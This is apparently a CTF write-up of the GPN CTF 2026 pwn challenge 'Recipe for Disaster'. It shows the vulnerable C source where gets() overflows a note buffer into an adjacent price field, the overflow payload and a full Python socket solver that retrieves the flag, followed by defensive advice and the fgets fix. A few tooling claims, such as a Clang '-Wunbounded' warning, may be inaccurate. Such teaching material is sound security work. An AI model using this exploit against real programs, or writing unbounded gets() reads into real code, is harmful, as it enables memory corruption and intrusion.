---
title: "GPN CTF 2026 — Recipe for Disaster: gets() Overflow into an Adjacent int"
slug: "gpn-ctf-2026-recipe-for-disaster"
description: "GPN CTF 2026 Pwn: gets() reads 36 bytes into a char note[32], spilling into the adjacent int price. Set price = -1, verify_total triggers print_coupon, flag prints."
date: 2026-06-07T19:55:00Z
lastmod: 2026-06-07T19:55:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
tags:
  - "gpn ctf 2026"
  - "recipe for disaster"
  - "gets overflow"
  - "stack buffer overflow"
  - "adjacent field overwrite"
  - "c11 deprecated gets"
  - "morris worm gets"
  - "pwn challenge"
series: ["GPN CTF 2026"]
keywords:
  - "gpn ctf recipe for disaster writeup"
  - "gets buffer overflow ctf"
  - "char note overflow int price"
  - "adjacent struct field overflow"
  - "c11 deprecated gets ctf"
  - "morris worm gets vulnerability"
toc: true
cover:
  image: "/images/articles/gpn-ctf-2026-recipe-for-disaster.png"
  alt: "GPN CTF 2026 Recipe for Disaster writeup — gets() overflows char note[32] into an adjacent int price field"
---

{{< ctf-meta platform="GPN CTF 2026 (kitctf)" difficulty="Easy" os="Pwn — stack buffer overflow, adjacent-field overwrite" skills="reading the Item struct layout to confirm note and price are adjacent with no padding, sending 32 bytes of A plus four bytes of 0xff to set price to -1, observing verify_total trigger print_coupon, recognising gets() as a deprecated-in-C11 vulnerability since the Morris Worm (1988)" >}}

**Recipe for Disaster** is the GPN CTF 2026 pwn challenge, and the most direct teaching example you'll ever see of *why `gets` was removed from C11*. A note-taking program reads into a 32-byte `note` field with `gets()` — no length limit. Type 35 characters and the 33rd through 36th overflow into the adjacent `int price` field in the same `Item` struct. Set `price = -1` and `verify_total()` triggers `print_coupon()` → flag. The flag itself names the lesson:

```
GPNCTF{Wa17, w17h theS3 prICEs, 0verf1oWS shOUld NoT 83 P0sS1Ble...}
```

Twenty minutes from connection to flag, mostly spent confirming the struct layout from the disassembly. This is the standalone deep-dive on `pwn/recipe-for-disaster` from the [GPN CTF 2026 master writeup](/ctf-writeups/gpn-ctf-2026-writeup/). Full source at [`pwn/recipe-for-disaster`](https://github.com/Abdelkad3r/gpn-ctf-2026/tree/master/pwn/recipe-for-disaster).

## Source

```c
typedef struct {
  char item[32];
  char note[32];
  int  price;
} Item;

void take_order(void) {
  const int order_count = 10;
  Item order[order_count];          // stack-allocated array of 10 Items
  int  n_items = 0;
  // ...
  Item *cur = &order[n_items];
  strncpy(cur->item, MENU[choice - 1].name, sizeof(cur->item) - 1);
  cur->price = MENU[choice - 1].price;          // set BEFORE gets()

  printf("Any note for the chef? (leave blank for none)\n> ");
  gets(cur->note);                              // <-- unbounded read
  // ...
  int total = calculate_total(order, n_items);
  verify_total(total);
}

void verify_total(int total) {
  if (total < 0) {
    print_coupon();   // reads /flag
    exit(0);
  }
  // ...
}
```

## Struct memory layout

`Item` has no padding between `note` and `price`:

```
offset  0  – 31 : char item[32]
offset 32  – 63 : char note[32]
offset 64  – 67 : int  price
```

`gets()` writes into `note` starting at offset 32, with **no length limit**. A payload longer than 32 bytes spills directly into `price`.

## The win condition

`verify_total()` calls `print_coupon()` — which opens `/flag` and prints it — whenever the running total is **negative**. Overwriting `price` with any negative 32-bit integer satisfies this. `0xffffffff` (`-1` in two's complement) is the simplest choice.

The order matters: `cur->price = MENU[choice-1].price` runs first, setting the legitimate price. `gets(cur->note)` then *overwrites* it. The subsequent `printf("Added: %s ($%d)")` already shows the corrupted value — `$-1` — confirming the overflow worked before we even submit the order.

## Exploit

```
Order menu item #1 (any item works)
Note: b"A" * 32 + b"\xff\xff\xff\xff"
Finish ordering (enter 0)
```

Step-by-step:

1. Send `1\n` → server sets `price = 1337`, then prompts for a note.
2. Send `b"A" * 32 + b"\xff\xff\xff\xff" + b"\n"` → `gets()` writes 36 bytes into `note`; the last 4 bytes land at `price`, overwriting it with `0xffffffff = -1`.
3. Send `0\n` → finish.
4. `calculate_total` sums one item: `total = -1`.
5. `verify_total(-1 < 0)` → `print_coupon()` → flag.

Full solver — stdlib only:

```python
import socket, ssl

ctx = ssl.create_default_context()
sock = ctx.wrap_socket(socket.create_connection((HOST, PORT)), server_hostname=HOST)

def send(data):
    sock.sendall(data)
def recv_until(needle):
    buf = b""
    while needle not in buf:
        buf += sock.recv(4096)
    return buf

recv_until(b"Choice: ")
send(b"1\n")
recv_until(b"> ")
send(b"A" * 32 + b"\xff\xff\xff\xff" + b"\n")
recv_until(b"Choice: ")
send(b"0\n")
print(sock.recv(4096).decode())
```

Run:

```
$ python3 solve.py
...
[SYSTEM] Pricing error detected! We sincerely apologise for
[SYSTEM] the inconvenience. Please accept this coupon:

GPNCTF{Wa17, w17h theS3 prICEs, 0verf1oWS shOUld NoT 83 P0sS1Ble...}
```

## Why "No Vulnerabilities. Guaranteed."

The banner proudly declares no vulnerabilities exist in the GPNCTF Food Ordering System. The menu item named **"Overwritten Return Pointer"** (price 1337) is a self-aware joke — both the challenge name and the first menu entry hint at the bug.

`gets()` has been a known vulnerability since the **Morris Worm (1988)**. It was deprecated in C11 / POSIX.1-2008 and removed from C standard headers in C23. Any compiler that still allows `gets` calls (mostly only against very old `glibc` headers) emits a loud `-Wdeprecated-declarations` warning. Any code review that sees `gets(` should treat it as a finding and block the PR.

The fix is a single character change: `gets(cur->note)` → `fgets(cur->note, sizeof(cur->note), stdin)`.

## Defender takeaway

- **`gets` is the canonical example of why "deprecate then remove" matters in C.** C11 deprecated it in 2011; C23 removed it from the standard. If your codebase is on a glibc old enough to still expose `gets`, switching to `fgets(buf, sizeof(buf), stdin)` is a mechanical fix.
- **Adjacent-field overwrite is the cheapest stack exploitation primitive.** No ASLR, no canary, no NX defeats it — the bug is entirely within the legitimate object's memory layout. If you allow an unbounded read into a struct field, every subsequent field is attacker-controlled, regardless of how hardened the rest of the binary is.
- **Static analysis tools catch this in seconds.** Coverity, GCC's `-Wstack-usage`, Clang's `-Wunbounded`, even `gcc -O2` warns on `gets`. Wire any of them into CI and PRs.
- **Code review is the cheapest fix.** A grep for `gets(`, `strcpy(`, `strcat(`, `sprintf(` (without bounds) across the codebase, plus a PR-time linter check, prevents 90% of stack-buffer-overflow bugs without any runtime cost.

## Frequently asked questions

### What's the bug in recipe-for-disaster?

`gets(cur->note)` reads from stdin into a 32-byte buffer with no length limit. Send 36 bytes — 32 padding plus 4 bytes of `0xff` — and the last 4 overflow into the adjacent `int price` field in the same `Item` struct, setting `price = -1`.

### Why does `price = -1` trigger the flag?

`verify_total()` calls `print_coupon()` (which reads `/flag`) when the order total is negative. A single item with `price = -1` gives `total = -1`, triggering `print_coupon`.

### Does this exploit need ASLR/NX/canary bypasses?

No. The bug is entirely within the legitimate `Item` struct memory layout. There's no return-address overwrite, no shellcode, no ROP. Adjacent-field overwrite happens in normal user-data memory — every mitigation (ASLR, NX, stack canaries) is irrelevant.

### What's the fix?

One-line change: `gets(cur->note)` → `fgets(cur->note, sizeof(cur->note), stdin)`. `fgets` takes an explicit length and respects it.

### Why is `gets` still available in any modern C codebase?

It isn't, in standard-conformant C23 toolchains. Older glibc still exposes `gets` for backwards compatibility, but any modern compiler emits `-Wdeprecated-declarations` warnings on the call. C11 deprecated `gets`; C23 removed it entirely. Code review at PR time should reject any `gets` reference.

### Is this a real bug class in production code?

Yes — adjacent-field overwrite via unbounded reads is the third-most-common stack-buffer-overflow primitive (after return-address overwrite and saved-register clobber). The first major real-world example was the Morris Worm (1988), which used `gets` overflow in `fingerd`. CVEs in this class still appear in 2024–2026 in legacy C codebases.

### Where can I find the solver?

Full source at [`pwn/recipe-for-disaster/solve.py`](https://github.com/Abdelkad3r/gpn-ctf-2026/tree/master/pwn/recipe-for-disaster). Master writeup at [/ctf-writeups/gpn-ctf-2026-writeup/](/ctf-writeups/gpn-ctf-2026-writeup/).

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What's the bug in recipe-for-disaster?","acceptedAnswer": {"@type": "Answer","text": "gets(cur->note) reads from stdin into a 32-byte buffer with no length limit. Send 36 bytes — 32 padding plus 4 bytes of 0xff — and the last 4 overflow into the adjacent int price field in the same Item struct, setting price = -1."}},
    {"@type": "Question","name": "Why does price = -1 trigger the flag?","acceptedAnswer": {"@type": "Answer","text": "verify_total() calls print_coupon() (which reads /flag) when the order total is negative. A single item with price = -1 gives total = -1, triggering print_coupon."}},
    {"@type": "Question","name": "Does this exploit need ASLR/NX/canary bypasses?","acceptedAnswer": {"@type": "Answer","text": "No. The bug is entirely within the legitimate Item struct memory layout. No return-address overwrite, no shellcode, no ROP. Adjacent-field overwrite happens in user-data memory — every mitigation (ASLR, NX, stack canaries) is irrelevant."}},
    {"@type": "Question","name": "What's the fix?","acceptedAnswer": {"@type": "Answer","text": "One-line change: gets(cur->note) → fgets(cur->note, sizeof(cur->note), stdin). fgets takes an explicit length and respects it."}},
    {"@type": "Question","name": "Why is gets still available in any modern C codebase?","acceptedAnswer": {"@type": "Answer","text": "It isn't in standard-conformant C23 toolchains. Older glibc still exposes gets for backwards compatibility, but modern compilers emit -Wdeprecated-declarations on the call. C11 deprecated gets; C23 removed it entirely."}},
    {"@type": "Question","name": "Is this a real bug class in production code?","acceptedAnswer": {"@type": "Answer","text": "Yes — adjacent-field overwrite via unbounded reads is the third-most-common stack-buffer-overflow primitive after return-address overwrite and saved-register clobber. The first major real-world example was the Morris Worm (1988) using gets overflow in fingerd. CVEs in this class still appear in legacy C codebases."}},
    {"@type": "Question","name": "Where can I find the solver code?","acceptedAnswer": {"@type": "Answer","text": "Full source at pwn/recipe-for-disaster/solve.py in github.com/Abdelkad3r/gpn-ctf-2026. Master writeup at cybersecurityelite.com/ctf-writeups/gpn-ctf-2026-writeup/."}}
  ]
}
</script>
